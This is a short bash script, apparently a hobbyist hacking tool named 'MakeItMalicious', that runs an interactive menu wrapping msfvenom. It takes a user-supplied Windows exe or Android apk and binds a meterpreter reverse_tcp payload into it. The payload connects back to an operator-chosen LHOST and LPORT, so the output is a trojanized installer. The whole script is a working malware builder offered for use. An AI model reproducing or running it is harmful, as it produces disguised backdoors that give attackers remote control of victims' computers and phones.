#!/bin/bash
# etc etc etc
# ..................


clear                                   
mkdir ~/Desktop/MakeItMalicious 
clear                                   
echo -e "\E[1;36m****** \e[32m WELCOME TO MALICIOUS \E[1;36m******"
echo -e "\E[1;32m                                                       
 ___ ___  ____ _     ____   __ ____ ___  __ __  _____     
|   |   |/    | |   |    | /  |    /   \|  |  |/ ___/   
| _   _ |  o  | |    |  | /  / |  |     |  |  (   \_    
|   |   |  _  |     ||  /   \_ |  |     |  :  |/  \ | 
|   |   |  |  |     ||  \     ||  |     |     |\    |      
|___|___|__|__|_____|____\____|____\___/ \__,_| \___|      
                                                                                     
                                                
 "                                    
echo -e "\e[31m   [\e[32mSELECT OPTION\e[31m]"
echo -e "\E[1;36m\E[36m[1] \e[36mPayload\e[31m [\e[32mCreating payload with msfvenom\e[31m]  "
tput sgr0                               
echo -e "\E[1;36m\E[1;36m[2] \e[36mQuit" 
tput sgr0
echo -e "\E[1,36m_____________________________________________________"

read options

case "$options" in
  "1" | "1" )

  echo -e "\E[1;36m****** \e[32mCRETAING PAYLOAD\E[1;36m *****"

PS3='Enter your choice : '
options=("Windows"  "Android"  "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Give Path of exe: ' path; read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp -x $path LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/MakeItMalicious/first.exe
            echo -e "\E[1;36m***\E[1;32m first.exe saved to ~/Desktop/MakeItMalicious\E[1;36m***"
            ;;
	"Android")
            read -p 'Give Path of apk: ' path ;read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp -x $path LHOST=$uservar LPORT=$userport R > ~/Desktop/MakeItMalicious/first.apk
            echo -e "\E[1;36m***\E[1;32m first.apk saved to ~/Desktop/MakeItMalicious\E[1;36m***"
            ;;  
	 "Quit")
            echo "Bye Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

 "2" | "2" )
            echo "Bye Bye" 
            ;;
        *) echo invalid option;;
    esac

